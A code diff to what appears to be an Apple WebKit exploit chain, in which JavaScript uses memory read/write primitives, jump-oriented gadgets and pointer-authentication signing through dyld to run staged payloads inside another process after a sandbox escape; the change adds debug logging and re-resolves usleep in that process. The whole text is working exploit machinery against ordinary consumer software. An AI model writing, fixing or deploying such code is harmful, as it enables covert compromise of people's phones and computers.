@@ -88,6 +88,7 @@
   let pe_log_buf = 0n;
   let pe_log_buf_off = 0n;
   let pe_log_buf_sz = 0n;
+  let globalDLSYM = 0n;
   let set_x19_gadget = 0n;
   let set_x30_gadget = 0n;
   let load_x0_0x0_gadget = 0n;
@@ -6749,6 +6750,10 @@
     return mpd_objc_msgSend_nowait_exit(obj, selector, jscript);
   }
   function mpd_pacib(ptr, ctx) {
+    // dyld_sign_pointer(ptr, addr, use_addr_diversity, ctx, key_type)
+    // mpd_fcall(address, x0, x1, x2, x3, x4, x5, x6, x7)
+    // For pacib with ctx <= 0xFFFF (no address diversity):
+    // x0=ptr, x1=addr(0), x2=use_addr_diversity(0), x3=ctx, x4=key_type(1)
     return mpd_fcall(dyld_signPointer_gadget, ptr, 0n, 0n, ctx, 1n);
   }
   function mpd_setup_fcall_jopchain() {
@@ -6783,20 +6788,34 @@
       pe_main_js_data = g_pe_main_js_data;
       pe_post_js_data = g_pe_post_js_data;
     }
+    LOG("[MPD] Creating pe_stage_1_cfstring...");
     let pe_stage_1_cfstring = mpd_create_cfstring(pe_stage1_js_data);
+    LOG("[MPD] Creating pe_main_cfstring...");
     let pe_main_cfstring = mpd_create_cfstring(pe_main_js_data);
+    LOG("[MPD] Setting up fcall jopchain...");
     let arr = mpd_setup_fcall_jopchain();
+    LOG("[MPD] jsvm_fcall_buff setup done");
     let jsvm_fcall_buff = arr[0];
     let jsvm_fcall_pc = arr[1];
     let jsvm_fcall_args = arr[2];
+    LOG("[MPD] Calling DLOPEN...");
     mpd_fcall(DLOPEN, mpd_get_cstring("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"), 2n);
+    LOG("[MPD] Getting JSContext class...");
     let mpd_jsc_class = mpd_objc_getClass(mpd_get_cstring("JSContext"));
+    LOG(`[MPD] JSContext class: ${mpd_jsc_class.hex()}`);
     let ctx = mpd_objc_alloc_init(mpd_jsc_class);
+    LOG(`[MPD] ctx allocated: ${ctx.hex()}`);
+    LOG("[MPD] Getting isNaN from ctx...");
     let isnan_value = mpd_objectForKeyedSubscript(ctx, "isNaN");
+    LOG(`[MPD] isnan_value: ${isnan_value.hex()}`);
     let isnan_func_addr = mpd_read64(isnan_value + 0x8n);
+    LOG(`[MPD] isnan_func_addr: ${isnan_func_addr.hex()}`);
     let isnan_executable_addr = mpd_read64(isnan_func_addr + 0x18n);
+    LOG(`[MPD] isnan_executable_addr: ${isnan_executable_addr.hex()}`);
     let isnan_code_ptr = isnan_executable_addr + 0x28n;
+    LOG("[MPD] Evaluating pe_stage_1...");
     mpd_evaluateScript(ctx, pe_stage_1_cfstring);
+    LOG("[MPD] pe_stage_1 evaluated");
     let unboxed_arr_value = mpd_objectForKeyedSubscript(ctx, "unboxed_arr");
     let unboxed_arr_addr = mpd_read64(unboxed_arr_value + 0x8n);
     let boxed_arr_value = mpd_objectForKeyedSubscript(ctx, "boxed_arr");
@@ -6837,6 +6856,8 @@
     let new_func_offsets_buffer = mpd_read64(new_func_offsets_addr + 0x10n);
     LOG(`[MPD] func_offsets_array buffer: ${new_func_offsets_buffer.hex()}`);
     let DLSYM = func_resolve("dlsym").noPAC();
+    // Save DLSYM globally for use after spawn_pe() - must use mpd_pacib for MPD context
+    globalDLSYM = mpd_pacib(DLSYM, 0xc2d0n);
     let idx = 0n;
     let js_inputs = mpd_malloc(0x100n);
     mpd_write64(js_inputs, pe_stage_1_cfstring);
@@ -6899,10 +6920,12 @@
   LOG("After xpc_connection_cancel, waiting for PE logs");
   sbx1_end = Date.now();
   // Flush pe_main.js logs from shared buffer (pe_main runs asynchronously)
-  if (pe_log_buf != 0n && pe_log_buf_off != 0n) {
+  if (pe_log_buf != 0n && pe_log_buf_off != 0n && globalDLSYM != 0n) {
     // Give pe_main.js time to start and write initial logs
     LOG("Calling USLEEP 500ms");
-    mpd_fcall(USLEEP, 500000n);  // 500ms
+    // Use MPD context DLSYM to resolve usleep (global USLEEP is WebContent context)
+    let USLEEP_MPD = mpd_fcall(globalDLSYM, 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("usleep"));
+    mpd_fcall(USLEEP_MPD, 500000n);  // 500ms
     LOG("After USLEEP, reading pe_log_len");
     let pe_log_len = mpd_read64(pe_log_buf_off);
     LOG("[MPD] pe_main.js log buffer len=" + pe_log_len);
